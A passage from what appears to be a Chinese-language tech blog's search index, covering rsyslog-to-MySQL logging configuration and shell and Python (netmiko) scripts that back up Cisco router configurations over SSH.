class=\"p\"\u003e;\u003c/span\u003email.none\u003cspan class=\"p\"\u003e;\u003c/span\u003eauthpriv.none\u003cspan class=\"p\"\u003e;\u003c/span\u003ecron.none               :ommysql:localhost,Syslog,nips,xxxxxxxx\n\u003c/span\u003e\u003c/span\u003e\u003cspan class=\"line\"\u003e\u003cspan class=\"cl\"\u003e\n\u003c/span\u003e\u003c/span\u003e\u003cspan class=\"line\"\u003e\u003cspan class=\"cl\"\u003e*.info\u003cspan class=\"p\"\u003e;\u003c/span\u003email.none\u003cspan class=\"p\"\u003e;\u003c/span\u003eauthpriv.none\u003cspan class=\"p\"\u003e;\u003c/span\u003ecron.none               action\u003cspan class=\"o\"\u003e(\u003c/span\u003e\u003cspan class=\"nv\"\u003etype\u003c/span\u003e\u003cspan class=\"o\"\u003e=\u003c/span\u003e\u003cspan class=\"s2\"\u003e\u0026#34;ommysql\u0026#34;\u003c/span\u003e \u003cspan class=\"nv\"\u003eserver\u003c/span\u003e\u003cspan class=\"o\"\u003e=\u003c/span\u003e\u003cspan class=\"s2\"\u003e\u0026#34;localhost\u0026#34;\u003c/span\u003e \u003cspan class=\"nv\"\u003edb\u003c/span\u003e\u003cspan class=\"o\"\u003e=\u003c/span\u003e\u003cspan class=\"s2\"\u003e\u0026#34;Syslog\u0026#34;\u003c/span\u003e \u003cspan class=\"nv\"\u003euid\u003c/span\u003e\u003cspan class=\"o\"\u003e=\u003c/span\u003e\u003cspan class=\"s2\"\u003e\u0026#34;nips\u0026#34;\u003c/span\u003e \u003cspan class=\"nv\"\u003epwd\u003c/span\u003e\u003cspan class=\"o\"\u003e=\u003c/span\u003e\u003cspan class=\"s2\"\u003e\u0026#34;xxxxxxxx\u0026#34;\u003c/span\u003e\u003cspan class=\"o\"\u003e)\u003c/span\u003e\n\u003c/span\u003e\u003c/span\u003e\u003cspan class=\"line\"\u003e\u003cspan class=\"cl\"\u003e\n\u003c/span\u003e\u003c/span\u003e\u003cspan class=\"line\"\u003e\u003cspan class=\"cl\"\u003e\u003cspan class=\"nv\"\u003e$template\u003c/span\u003e dbFormat,\u003cspan class=\"s2\"\u003e\u0026#34;insert into SystemEvents (Message, Facility,FromHost, Priority, DeviceReportedTime, ReceivedAt, InfoUnitID, SysLogTag) values (\u0026#39;%msg%\u0026#39;, %syslogfacility%, \u0026#39;%fromhost-ip%\u0026#39;,%syslogpriority%, \u0026#39;%timereported:::date-mysql%\u0026#39;, \u0026#39;%timegenerated:::date-mysql%\u0026#39;, %iut%, \u0026#39;%syslogtag%\u0026#39;)\u0026#34;\u003c/span\u003e,sql\n\u003c/span\u003e\u003c/span\u003e\u003cspan class=\"line\"\u003e\u003cspan class=\"cl\"\u003eaction\u003cspan class=\"o\"\u003e(\u003c/span\u003e\u003cspan class=\"nv\"\u003etype\u003c/span\u003e\u003cspan class=\"o\"\u003e=\u003c/span\u003e\u003cspan class=\"s2\"\u003e\u0026#34;ommysql\u0026#34;\u003c/span\u003e \u003cspan class=\"nv\"\u003eserver\u003c/span\u003e\u003cspan class=\"o\"\u003e=\u003c/span\u003e\u003cspan class=\"s2\"\u003e\u0026#34;localhost\u0026#34;\u003c/span\u003e \u003cspan class=\"nv\"\u003eserverport\u003c/span\u003e\u003cspan class=\"o\"\u003e=\u003c/span\u003e\u003cspan class=\"s2\"\u003e\u0026#34;3306\u0026#34;\u003c/span\u003e \u003cspan class=\"nv\"\u003edb\u003c/span\u003e\u003cspan class=\"o\"\u003e=\u003c/span\u003e\u003cspan class=\"s2\"\u003e\u0026#34;Syslog\u0026#34;\u003c/span\u003e \u003cspan class=\"nv\"\u003euid\u003c/span\u003e\u003cspan class=\"o\"\u003e=\u003c/span\u003e\u003cspan class=\"s2\"\u003e\u0026#34;nips\u0026#34;\u003c/span\u003e \u003cspan class=\"nv\"\u003epwd\u003c/span\u003e\u003cspan class=\"o\"\u003e=\u003c/span\u003e\u003cspan class=\"s2\"\u003e\u0026#34;xxxxxxxx\u0026#34;\u003c/span\u003e \u003cspan class=\"nv\"\u003etemplate\u003c/span\u003e\u003cspan class=\"o\"\u003e=\u003c/span\u003e\u003cspan class=\"s2\"\u003e\u0026#34;dbFormat\u0026#34;\u003c/span\u003e\u003cspan class=\"o\"\u003e)\u003c/span\u003e\n\u003c/span\u003e\u003c/span\u003e\u003cspan class=\"line\"\u003e\u003cspan class=\"cl\"\u003e\n\u003c/span\u003e\u003c/span\u003e\u003cspan class=\"line\"\u003e\u003cspan class=\"cl\"\u003e\u003cspan class=\"c1\"\u003e#172.18.31.34上的实际用法：\u003c/span\u003e\n\u003c/span\u003e\u003c/span\u003e\u003cspan class=\"line\"\u003e\u003cspan class=\"cl\"\u003e\u003cspan class=\"k\"\u003eif\u003c/span\u003e \u003cspan class=\"nv\"\u003e$fromhost\u003c/span\u003e-ip \u003cspan class=\"o\"\u003e==\u003c/span\u003e  \u003cspan class=\"s1\"\u003e\u0026#39;172.18.18.9\u0026#39;\u003c/span\u003e \u003cspan class=\"k\"\u003ethen\u003c/span\u003e  \u003cspan class=\"o\"\u003e{\u003c/span\u003e\n\u003c/span\u003e\u003c/span\u003e\u003cspan class=\"line\"\u003e\u003cspan class=\"cl\"\u003e    \u003cspan class=\"k\"\u003eif\u003c/span\u003e \u003cspan class=\"nv\"\u003e$syslogpriority\u003c/span\u003e \u003cspan class=\"o\"\u003e==\u003c/span\u003e \u003cspan class=\"m\"\u003e7\u003c/span\u003e \u003cspan class=\"k\"\u003ethen\u003c/span\u003e  \u003cspan class=\"o\"\u003e{\u003c/span\u003e\n\u003c/span\u003e\u003c/span\u003e\u003cspan class=\"line\"\u003e\u003cspan class=\"cl\"\u003e        \u003cspan class=\"nv\"\u003e$template\u003c/span\u003e dbFormat1,\u003cspan class=\"s2\"\u003e\u0026#34;insert into SystemEvents (Message, Facility,FromHost, Priority, DeviceReportedTime, ReceivedAt, InfoUnitID, SysLogTag) values (\u0026#39;%msg%\u0026#39;, 10, \u0026#39;%fromhost-ip%\u0026#39;,%syslogpriority%, \u0026#39;%timereported:::date-mysql%\u0026#39;, \u0026#39;%timegenerated:::date-mysql%\u0026#39;, %iut%, \u0026#39;nips\u0026#39;)\u0026#34;\u003c/span\u003e,sql\n\u003c/span\u003e\u003c/span\u003e\u003cspan class=\"line\"\u003e\u003cspan class=\"cl\"\u003e        action\u003cspan class=\"o\"\u003e(\u003c/span\u003e\u003cspan class=\"nv\"\u003etype\u003c/span\u003e\u003cspan class=\"o\"\u003e=\u003c/span\u003e\u003cspan class=\"s2\"\u003e\u0026#34;ommysql\u0026#34;\u003c/span\u003e \u003cspan class=\"nv\"\u003eserver\u003c/span\u003e\u003cspan class=\"o\"\u003e=\u003c/span\u003e\u003cspan class=\"s2\"\u003e\u0026#34;localhost\u0026#34;\u003c/span\u003e \u003cspan class=\"nv\"\u003eserverport\u003c/span\u003e\u003cspan class=\"o\"\u003e=\u003c/span\u003e\u003cspan class=\"s2\"\u003e\u0026#34;3306\u0026#34;\u003c/span\u003e \u003cspan class=\"nv\"\u003edb\u003c/span\u003e\u003cspan class=\"o\"\u003e=\u003c/span\u003e\u003cspan class=\"s2\"\u003e\u0026#34;Syslog\u0026#34;\u003c/span\u003e \u003cspan class=\"nv\"\u003euid\u003c/span\u003e\u003cspan class=\"o\"\u003e=\u003c/span\u003e\u003cspan class=\"s2\"\u003e\u0026#34;nips\u0026#34;\u003c/span\u003e \u003cspan class=\"nv\"\u003epwd\u003c/span\u003e\u003cspan class=\"o\"\u003e=\u003c/span\u003e\u003cspan class=\"s2\"\u003e\u0026#34;xxxxxxxx\u0026#34;\u003c/span\u003e \u003cspan class=\"nv\"\u003etemplate\u003c/span\u003e\u003cspan class=\"o\"\u003e=\u003c/span\u003e\u003cspan class=\"s2\"\u003e\u0026#34;dbFormat1\u0026#34;\u003c/span\u003e\u003cspan class=\"o\"\u003e)\u003c/span\u003e\n\u003c/span\u003e\u003c/span\u003e\u003cspan class=\"line\"\u003e\u003cspan class=\"cl\"\u003e    \u003cspan class=\"o\"\u003e}\u003c/span\u003e\n\u003c/span\u003e\u003c/span\u003e\u003cspan class=\"line\"\u003e\u003cspan class=\"cl\"\u003e    \u003cspan class=\"k\"\u003eelse\u003c/span\u003e \u003cspan class=\"o\"\u003e{\u003c/span\u003e\n\u003c/span\u003e\u003c/span\u003e\u003cspan class=\"line\"\u003e\u003cspan class=\"cl\"\u003e        \u003cspan class=\"nv\"\u003e$template\u003c/span\u003e dbFormat2,\u003cspan class=\"s2\"\u003e\u0026#34;insert into SystemEvents (Message, Facility,FromHost, Priority, DeviceReportedTime, ReceivedAt, InfoUnitID, SysLogTag) values (\u0026#39;time:%msg%\u0026#39;, 10, \u0026#39;%fromhost-ip%\u0026#39;,%syslogpriority%, \u0026#39;%timereported:::date-mysql%\u0026#39;, \u0026#39;%timegenerated:::date-mysql%\u0026#39;, %iut%, \u0026#39;nips\u0026#39;)\u0026#34;\u003c/span\u003e,sql\n\u003c/span\u003e\u003c/span\u003e\u003cspan class=\"line\"\u003e\u003cspan class=\"cl\"\u003e        action\u003cspan class=\"o\"\u003e(\u003c/span\u003e\u003cspan class=\"nv\"\u003etype\u003c/span\u003e\u003cspan class=\"o\"\u003e=\u003c/span\u003e\u003cspan class=\"s2\"\u003e\u0026#34;ommysql\u0026#34;\u003c/span\u003e \u003cspan class=\"nv\"\u003eserver\u003c/span\u003e\u003cspan class=\"o\"\u003e=\u003c/span\u003e\u003cspan class=\"s2\"\u003e\u0026#34;localhost\u0026#34;\u003c/span\u003e \u003cspan class=\"nv\"\u003eserverport\u003c/span\u003e\u003cspan class=\"o\"\u003e=\u003c/span\u003e\u003cspan class=\"s2\"\u003e\u0026#34;3306\u0026#34;\u003c/span\u003e \u003cspan class=\"nv\"\u003edb\u003c/span\u003e\u003cspan class=\"o\"\u003e=\u003c/span\u003e\u003cspan class=\"s2\"\u003e\u0026#34;Syslog\u0026#34;\u003c/span\u003e \u003cspan class=\"nv\"\u003euid\u003c/span\u003e\u003cspan class=\"o\"\u003e=\u003c/span\u003e\u003cspan class=\"s2\"\u003e\u0026#34;nips\u0026#34;\u003c/span\u003e \u003cspan class=\"nv\"\u003epwd\u003c/span\u003e\u003cspan class=\"o\"\u003e=\u003c/span\u003e\u003cspan class=\"s2\"\u003e\u0026#34;xxxxxxxx\u0026#34;\u003c/span\u003e \u003cspan class=\"nv\"\u003etemplate\u003c/span\u003e\u003cspan class=\"o\"\u003e=\u003c/span\u003e\u003cspan class=\"s2\"\u003e\u0026#34;dbFormat2\u0026#34;\u003c/span\u003e\u003cspan class=\"o\"\u003e)\u003c/span\u003e\n\u003c/span\u003e\u003c/span\u003e\u003cspan class=\"line\"\u003e\u003cspan class=\"cl\"\u003e    \u003cspan class=\"o\"\u003e}\u003c/span\u003e\n\u003c/span\u003e\u003c/span\u003e\u003cspan class=\"line\"\u003e\u003cspan class=\"cl\"\u003e\u003cspan class=\"o\"\u003e}\u003c/span\u003e\n\u003c/span\u003e\u003c/span\u003e\u003cspan class=\"line\"\u003e\u003cspan class=\"cl\"\u003e\u003cspan class=\"p\"\u003e\u0026amp;\u003c/span\u003e ~\n\u003c/span\u003e\u003c/span\u003e\u003c/code\u003e\u003c/pre\u003e\u003c/div\u003e\u003cp\u003eRsyslog中\u0026amp; ~的用法\u003c/p\u003e","title":"Rsyslog的一些特殊用法"},{"content":"这个其实是网络工程师的工作，有以下两种方法：\n一、用ssh备份Cisco设备的脚本 需要事先在/root/.ssh/config配置好直接登录，并且在Cisco设备里设置好权限级别，可以执行show run\n#!/bin/sh sshcmd=\u0026#34;ssh -o LogLevel=quiet\u0026#34; $sshcmd $1 \u0026#34;show run\u0026#34; \u0026gt; /root/backup/$1-$(date \u0026#39;+%Y%m%d\u0026#39;).txt 二、备份Cisco设备的Python脚本，这个可控性更高： 首选需要在/export/servers/python363装好python, pip install netmiko 其次，在路由器上可以配置en的密码\n#!/export/servers/python363/bin/python3.6 from netmiko import Netmiko import time tw_bgp = { \u0026#34;device_type\u0026#34;: \u0026#34;cisco_ios\u0026#34;, \u0026#34;host\u0026#34;: \u0026#34;tw-bgp\u0026#34;, \u0026#34;ip\u0026#34;: \u0026#34;192.168.1.10\u0026#34;, \u0026#34;username\u0026#34;: \u0026#34;noc\u0026#34;, \u0026#34;use_keys\u0026#34;: True, \u0026#34;secret\u0026#34; : \u0026#34;xxxxxxxx\u0026#34;, \u0026#34;key_file\u0026#34;: \u0026#34;/root/.ssh/id_jump_rsa_new\u0026#34;, } tw_r1_e1 = { \u0026#34;device_type\u0026#34;: \u0026#34;cisco_ios\u0026#34;, \u0026#34;host\u0026#34;: \u0026#34;tw-r1-e1\u0026#34;, \u0026#34;ip\u0026#34;: \u0026#34;192.168.1.11\u0026#34;, \u0026#34;username\u0026#34;: \u0026#34;noc\u0026#34;, \u0026#34;use_keys\u0026#34;: True, \u0026#34;key_file\u0026#34;: \u0026#34;/root/.ssh/id_jump_rsa_new\u0026#34;, } tw_r1_e2 = { \u0026#34;device_type\u0026#34;: \u0026#34;cisco_ios\u0026#34;, \u0026#34;host\u0026#34;: \u0026#34;tw-r1-e2\u0026#34;, \u0026#34;ip\u0026#34;: \u0026#34;192.168.1.12\u0026#34;, \u0026#34;username\u0026#34;: \u0026#34;noc\u0026#34;, \u0026#34;use_keys\u0026#34;: True, \u0026#34;key_file\u0026#34;: \u0026#34;/root/.ssh/id_jump_rsa_new\u0026#34;, } tw_r2_e1 = { \u0026#34;device_type\u0026#34;: \u0026#34;cisco_ios\u0026#34;, \u0026#34;host\u0026#34;: \u0026#34;tw-r2-e1\u0026#34;, \u0026#34;ip\u0026#34;: \u0026#34;192.168.1.13\u0026#34;, \u0026#34;username\u0026#34;: \u0026#34;noc\u0026#34;, \u0026#34;use_keys\u0026#34;: True, \u0026#34;key_file\u0026#34;: \u0026#34;/root/.ssh/id_jump_rsa_new\u0026#34;, } tw_r2_e2 = { \u0026#34;device_type\u0026#34;: \u0026#34;cisco_ios\u0026#34;, \u0026#34;host\u0026#34;: \u0026#34;tw-r2-e2\u0026#34;, \u0026#34;ip\u0026#34;: \u0026#34;192.168.1.14\u0026#34;, \u0026#34;username\u0026#34;: \u0026#34;noc\u0026#34;, \u0026#34;use_keys\u0026#34;: True, \u0026#34;key_file\u0026#34;: \u0026#34;/root/.ssh/id_jump_rsa_new\u0026#34;, } devices=[tw_bgp, tw_r1_e1, tw_r1_e2, tw_r2_e1, tw_r2_e2] for dev in devices: name = dev[\u0026#34;ip\u0026#34;] connection = Netmiko(**dev) connection.enable() out = connection.send_command(\u0026#34;show running-config\u0026#34;) calender = time.strftime(\u0026#34;%Y%m%d\u0026#34;) file_name = \u0026#39;{}-{}.txt\u0026#39;.format(dev[\u0026#34;host\u0026#34;],calender) file = open(file_name ,\u0026#34;w\u0026#34;) file.write(out) file.close() connection.disconnect() print(\u0026#34;BACKUP for %s done\u0026#34; %dev[\u0026#34;host\u0026#34;]) ","permalink":"https://rendoumi.com/posts/20231211-netdev_backup/","summary":"\u003cp\u003e这个其实是网络工程师的工作，有以下两种方法：\u003c/p\u003e\n\u003cp\u003e一、用ssh备份Cisco设备的脚本\u003c!-- raw HTML omitted --\u003e\n需要事先在/root/.ssh/config配置好直接登录，并且在Cisco设备里设置好权限级别，可以执行show run\u003c/p\u003e\n\u003cdiv class=\"highlight\"\u003e\u003cpre tabindex=\"0\" class=\"chroma\"\u003e\u003ccode class=\"language-bash\" data-lang=\"bash\"\u003e\u003cspan class=\"line\"\u003e\u003cspan class=\"cl\"\u003e\u003cspan class=\"cp\"\u003e#!/bin/sh\n\u003c/span\u003e\u003c/span\u003e\u003c/span\u003e\u003cspan class=\"line\"\u003e\u003cspan class=\"cl\"\u003e\u003cspan class=\"cp\"\u003e\u003c/span\u003e\u003cspan class=\"nv\"\u003esshcmd\u003c/span\u003e\u003cspan class=\"o\"\u003e=\u003c/span\u003e\u003cspan class=\"s2\"\u003e\u0026#34;ssh -o LogLevel=quiet\u0026#34;\u003c/span\u003e\n\u003c/span\u003e\u003c/span\u003e\u003cspan class=\"line\"\u003e\u003cspan class=\"cl\"\u003e\u003cspan class=\"nv\"\u003e$sshcmd\u003c/span\u003e \u003cspan class=\"nv\"\u003e$1\u003c/span\u003e \u003cspan class=\"s2\"\u003e\u0026#34;show run\u0026#34;\u003c/span\u003e \u0026gt; /root/backup/\u003cspan class=\"nv\"\u003e$1\u003c/span\u003e-\u003cspan class=\"k\"\u003e$(\u003c/span\u003edate \u003cspan class=\"s1\"\u003e\u0026#39;+%Y%m%d\u0026#39;\u003c/span\u003e\u003cspan class=\"k\"\u003e)\u003c/span\u003e.txt\n\u003c/span\u003e\u003c/span\u003e\u003c/code\u003e\u003c/pre\u003e\u003c/div\u003e\u003cp\u003e二、备份Cisco设备的Python脚本，这个可控性更高：\u003c!-- raw HTML omitted --\u003e\n首选需要在/export/servers/python363装好python, pip install netmiko\n其次，在路由器上可以配置en的密码\u003c/p\u003e\n\u003cdiv class=\"highlight\"\u003e\u003cpre tabindex=\"0\" class=\"chroma\"\u003e\u003ccode class=\"language-python\" data-lang=\"python\"\u003e\u003cspan class=\"line\"\u003e\u003cspan class=\"cl\"\u003e\u003cspan class=\"ch\"\u003e#!/export/servers/python363/bin/python3.6\u003c/span\u003e\n\u003c/span\u003e\u003c/span\u003e\u003cspan class=\"line\"\u003e\u003cspan class=\"cl\"\u003e\n\u003c/span\u003e\u003c/span\u003e\u003cspan class=\"line\"\u003e\u003cspan class=\"cl\"\u003e\u003cspan class=\"kn\"\u003efrom\u003c/span\u003e \u003cspan class=\"nn\"\u003enetmiko\u003c/span\u003e \u003cspan class=\"kn\"\u003eimport\u003c/span\u003e \u003cspan class=\"n\"\u003eNetmiko\u003c/span\u003e\n\u003c/span\u003e\u003c/span\u003e\u003cspan class=\"line\"\u003e\u003cspan class=\"cl\"\u003e\u003cspan class=\"kn\"\u003eimport\u003c/span\u003e \u003cspan class=\"nn\"\u003etime\u003c/span\u003e\n\u003c/span\u003e\u003c/span\u003e\u003cspan class=\"line\"\u003e\u003cspan class=\"cl\"\u003e \n\u003c/span\u003e\u003c/span\u003e\u003cspan class=\"line\"\u003e\u003cspan class=\"cl\"\u003e\u003cspan class=\"n\"\u003etw_bgp\u003c/span\u003e \u003cspan class=\"o\"\u003e=\u003c/span\u003e \u003cspan class=\"p\"\u003e{\u003c/span\u003e\n\u003c/span\u003e\u003c/span\u003e\u003cspan class=\"line\"\u003e\u003cspan class=\"cl\"\u003e    \u003cspan class=\"s2\"\u003e\u0026#34;device_type\u0026#34;\u003c/span\u003e\u003cspan class=\"p\"\u003e:\u003c/span\u003e \u003cspan class=\"s2\"\u003e\u0026#34;cisco_ios\u0026#34;\u003c/span\u003e\u003cspan class=\"p\"\u003e,\u003c/span\u003e\n\u003c/span\u003e\u003c/span\u003e\u003cspan class=\"line\"\u003e\u003cspan class=\"cl\"\u003e    \u003cspan class=\"s2\"\u003e\u0026#34;host\u0026#34;\u003c/span\u003e\u003cspan class=\"p\"\u003e:\u003c/span\u003e \u003cspan class=\"s2\"\u003e\u0026#34;tw-bgp\u0026#34;\u003c/span\u003e\u003cspan class=\"p\"\u003e,\u003c/span\u003e\n\u003c/span\u003e\u003c/span\u003e\u003cspan class=\"line\"\u003e\u003cspan class=\"cl\"\u003e    \u003cspan class=\"s2\"\u003e\u0026#34;ip\u0026#34;\u003c/span\u003e\u003cspan class=\"p\"\u003e:\u003c/span\u003e \u003cspan class=\"s2\"\u003e\u0026#34;192.168.1.10\u0026#34;\u003c/span\u003e\u003cspan class=\"p\"\u003e,\u003c/span\u003e\n\u003c/span\u003e\u003c/span\u003e\u003cspan class=\"line\"\u003e\u003cspan class=\"cl\"\u003e    \u003cspan class=\"s2\"\u003e\u0026#34;username\u0026#34;\u003c/span\u003e\u003cspan class=\"p\"\u003e:\u003c/span\u003e \u003cspan class=\"s2\"\u003e\u0026#34;noc\u0026#34;\u003c/span\u003e\u003cspan class=\"p\"\u003e,\u003c/span\u003e\n\u003c/span\u003e\u003c/span\u003e\u003cspan class=\"line\"\u003e\u003cspan class=\"cl\"\u003e    \u003cspan class=\"s2\"\u003e\u0026#34;use_keys\u0026#34;\u003c/span\u003e\u003cspan class=\"p\"\u003e:\u003c/span\u003e \u003cspan class=\"kc\"\u003eTrue\u003c/span\u003e\u003cspan class=\"p\"\u003e,\u003c/span\u003e\n\u003c/span\u003e\u003c/span\u003e\u003cspan class=\"line\"\u003e\u003cspan class=\"cl\"\u003e    \u003cspan class=\"s2\"\u003e\u0026#34;secret\u0026#34;\u003c/span\u003e \u003cspan class=\"p\"\u003e:\u003c/span\u003e \u003cspan class=\"s2\"\u003e\u0026#34;xxxxxxxx\u0026#34;\u003c/span\u003e\u003cspan class=\"p\"\u003e,\u003c/span\u003e\n\u003c/span\u003e\u003c/span\u003e\u003cspan class=\"line\"\u003e\u003cspan class=\"cl\"\u003e    \u003cspan class=\"s2\"\u003e\u0026#34;key_file\u0026#34;\u003c/span\u003e\u003cspan class=\"p\"\u003e:\u003c/span\u003e \u003cspan class=\"s2\"\u003e\u0026#34;/root/.ssh/id_jump_rsa_new\u0026#34;\u003c/span\u003e\u003cspan class=\"p\"\u003e,\u003c/span\u003e\n\u003c/span\u003e\u003c/span\u003e\u003cspan class=\"line\"\u003e\u003cspan class=\"cl\"\u003e\u003cspan class=\"p\"\u003e}\u003c/span\u003e\n\u003c/span\u003e\u003c/span\u003e\u003cspan class=\"line\"\u003e\u003cspan class=\"cl\"\u003e\n\u003c/span\u003e\u003c/span\u003e\u003cspan class=\"line\"\u003e\u003cspan class=\"cl\"\u003e\u003cspan class=\"n\"\u003etw_r1_e1\u003c/span\u003e \u003cspan class=\"o\"\u003e=\u003c/span\u003e \u003cspan class=\"p\"\u003e{\u003c/span\u003e\n\u003c/span\u003e\u003c/span\u003e\u003cspan class=\"line\"\u003e\u003cspan class=\"cl\"\u003e    \u003cspan class=\"s2\"\u003e\u0026#34;device_type\u0026#34;\u003c/span\u003e\u003cspan class=\"p\"\u003e:\u003c/span\u003e \u003cspan class=\"s2\"\u003e\u0026#34;cisco_ios\u0026#34;\u003c/span\u003e\u003cspan class=\"p\"\u003e,\u003c/span\u003e\n\u003c/span\u003e\u003c/span\u003e\u003cspan class=\"line\"\u003e\u003cspan class=\"cl\"\u003e    \u003cspan class=\"s2\"\u003e\u0026#34;host\u0026#34;\u003c/span\u003e\u003cspan class=\"p\"\u003e:\u003c/span\u003e \u003cspan class=\"s2\"\u003e\u0026#34;tw-r1-e1\u0026#34;\u003c/span\u003e\u003cspan class=\"p\"\u003e,\u003c/span\u003e\n\u003c/span\u003e\u003c/span\u003e\u003cspan class=\"line\"\u003e\u003cspan class=\"cl\"\u003e    \u003cspan class=\"s2\"\u003e\u0026#34;ip\u0026#34;\u003c/span\u003e\u003cspan class=\"p\"\u003e:\u003c/span\u003e \u003cspan class=\"s2\"\u003e\u0026#34;192.168.1.11\u0026#34;\u003c/span\u003e\u003cspan class=\"p\"\u003e,\u003c/span\u003e\n\u003c/span\u003e\u003c/span\u003e\u003cspan class=\"line\"\u003e\u003cspan class=\"cl\"\u003e    \u003cspan class=\"s2\"\u003e\u0026#34;username\u0026#34;\u003c/span\u003e\u003cspan class=\"p\"\u003e:\u003c/span\u003e \u003cspan class=\"s2\"\u003e\u0026#34;noc\u0026#34;\u003c/span\u003e\u003cspan class=\"p\"\u003e,\u003c/span\u003e\n\u003c/span\u003e\u003c/span\u003e\u003cspan class=\"line\"\u003e\u003cspan class=\"cl\"\u003e    \u003cspan class=\"s2\"\u003e\u0026#34;use_keys\u0026#34;\u003c/span\u003e\u003cspan class=\"p\"\u003e:\u003c/span\u003e \u003cspan class=\"kc\"\u003eTrue\u003c/span\u003e\u003cspan class=\"p\"\u003e,\u003c/span\u003e\n\u003c/span\u003e\u003c/span\u003e\u003cspan class=\"line\"\u003e\u003cspan class=\"cl\"\u003e    \u003cspan class=\"s2\"\u003e\u0026#34;key_file\u0026#34;\u003c/span\u003e\u003cspan class=\"p\"\u003e:\u003c/span\u003e \u003cspan class=\"s2\"\u003e\u0026#34;/root/.ssh/id_jump_rsa_new\u0026#34;\u003c/span\u003e\u003cspan class=\"p\"\u003e,\u003c/span\u003e\n\u003c/span\u003e\u003c/span\u003e\u003cspan class=\"line\"\u003e\u003cspan class=\"cl\"\u003e\u003cspan class=\"p\"\u003e}\u003c/span\u003e\n\u003c/span\u003e\u003c/span\u003e\u003cspan class=\"line\"\u003e\u003cspan class=\"cl\"\u003e\n\u003c/span\u003e\u003c/span\u003e\u003cspan class=\"line\"\u003e\u003cspan class=\"cl\"\u003e\u003cspan class=\"n\"\u003etw_r1_e2\u003c/span\u003e \u003cspan class=\"o\"\u003e=\u003c/span\u003e \u003cspan class=\"p\"\u003e{\u003c/span\u003e\n\u003c/span\u003e\u003c/span\u003e\u003cspan class=\"line\"\u003e\u003cspan class=\"cl\"\u003e    \u003cspan class=\"s2\"\u003e\u0026#34;device_type\u0026#34;\u003c/span\u003e\u003cspan class=\"p\"\u003e:\u003c/span\u003e \u003cspan class=\"s2\"\u003e\u0026#34;cisco_ios\u0026#34;\u003c/span\u003e\u003cspan class=\"p\"\u003e,\u003c/span\u003e\n\u003c/span\u003e\u003c/span\u003e\u003cspan class=\"line\"\u003e\u003cspan class=\"cl\"\u003e    \u003cspan class=\"s2\"\u003e\u0026#34;host\u0026#34;\u003c/span\u003e\u003cspan class=\"p\"\u003e:\u003c/span\u003e \u003cspan class=\"s2\"\u003e\u0026#34;tw-r1-e2\u0026#34;\u003c/span\u003e\u003cspan class=\"p\"\u003e,\u003c/span\u003e\n\u003c/span\u003e\u003c/span\u003e\u003cspan class=\"line\"\u003e\u003cspan class=\"cl\"\u003e    \u003cspan class=\"s2\"\u003e\u0026#34;ip\u0026#34;\u003c/span\u003e\u003cspan class=\"p\"\u003e:\u003c/span\u003e \u003cspan class=\"s2\"\u003e\u0026#34;192.168.1.12\u0026#34;\u003c/span\u003e\u003cspan class=\"p\"\u003e,\u003c/span\u003e\n\u003c/span\u003e\u003c/span\u003e\u003cspan class=\"line\"\u003e\u003cspan class=\"cl\"\u003e    \u003cspan class=\"s2\"\u003e\u0026#34;username\u0026#34;\u003c/span\u003e\u003cspan class=\"p\"\u003e:\u003c/span\u003e \u003cspan class=\"s2\"\u003e\u0026#34;noc\u0026#34;\u003c/span\u003e\u003cspan class=\"p\"\u003e,\u003c/span\u003e\n\u003c/span\u003e\u003c/span\u003e\u003cspan class=\"line\"\u003e\u003cspan class=\"cl\"\u003e    \u003cspan class=\"s2\"\u003e\u0026#34;use_keys\u0026#34;\u003c/span\u003e\u003cspan class=\"p\"\u003e:\u003c/span\u003e \u003cspan class=\"kc\"\u003eTrue\u003c/span\u003e\u003cspan class=\"p\"\u003e,\u003c/span\u003e\n\u003c/span\u003e\u003c/span\u003e\u003cspan class=\"line\"\u003e\u003cspan class=\"cl\"\u003e    \u003cspan class=\"s2\"\u003e\u0026#34;key_file\u0026#34;\u003c/span\u003e\u003cspan class=\"p\"\u003e:\u003c/span\u003e \u003cspan class=\"s2\"\u003e\u0026#34;/root/.ssh/id_jump_rsa_new\u0026#34;\u003c/span\u003e\u003cspan class=\"p\"\u003e,\u003c/span\u003e\n\u003c/span\u003e\u003c/span\u003e\u003cspan class=\"line\"\u003e\u003cspan class=\"cl\"\u003e\u003cspan class=\"p\"\u003e}\u003c/span\u003e\n\u003c/span\u003e\u003c/span\u003e\u003cspan class=\"line\"\u003e\u003cspan class=\"cl\"\u003e\n\u003c/span\u003e\u003c/span\u003e\u003cspan class=\"line\"\u003e\u003cspan class=\"cl\"\u003e\u003cspan class=\"n\"\u003etw_r2_e1\u003c/span\u003e \u003cspan class=\"o\"\u003e=\u003c/span\u003e \u003cspan class=\"p\"\u003e{\u003c/span\u003e\n\u003c/span\u003e\u003c/span\u003e\u003cspan class=\"line\"\u003e\u003cspan class=\"cl\"\u003e    \u003cspan class=\"s2\"\u003e\u0026#34;device_type\u0026#34;\u003c/span\u003e\u003cspan class=\"p\"\u003e:\u003c/span\u003e \u003cspan class=\"s2\"\u003e\u0026#34;cisco_ios\u0026#34;\u003c/span\u003e\u003cspan class=\"p\"\u003e,\u003c/span\u003e\n\u003c/span\u003e\u003c/span\u003e\u003cspan class=\"line\"\u003e\u003cspan class=\"cl\"\u003e    \u003cspan class=\"s2\"\u003e\u0026#34;host\u0026#34;\u003c/span\u003e\u003cspan class=\"p\"\u003e:\u003c/span\u003e \u003cspan class=\"s2\"\u003e\u0026#34;tw-r2-e1\u0026#34;\u003c/span\u003e\u003cspan class=\"p\"\u003e,\u003c/span\u003e\n\u003c/span\u003e\u003c/span\u003e\u003cspan class=\"line\"\u003e\u003cspan class=\"cl\"\u003e    \u003cspan class=\"s2\"\u003e\u0026#34;ip\u0026#34;\u003c/span\u003e\u003cspan class=\"p\"\u003e:\u003c/span\u003e \u003cspan class=\"s2\"\u003e\u0026#34;192.168.1.13\u0026#34;\u003c/span\u003e\u003cspan class=\"p\"\u003e,\u003c/span\u003e\n\u003c/span\u003e\u003c/span\u003e\u003cspan class=\"line\"\u003e\u003cspan class=\"cl\"\u003e    \u003cspan class=\"s2\"\u003e\u0026#34;username\u0026#34;\u003c/span\u003e\u003cspan class=\"p\"\u003e:\u003c/span\u003e \u003cspan class=\"s2\"\u003e\u0026#34;noc\u0026#34;\u003c/span\u003e\u003cspan class=\"p\"\u003e,\u003c/span\u003e\n\u003c/span\u003e\u003c/span\u003e\u003cspan class=\"line\"\u003e\u003cspan class=\"cl\"\u003e    \u003cspan class=\"s2\"\u003e\u0026#34;use_keys\u0026#34;\u003c/span\u003e\u003cspan class=\"p\"\u003e:\u003c/span\u003e 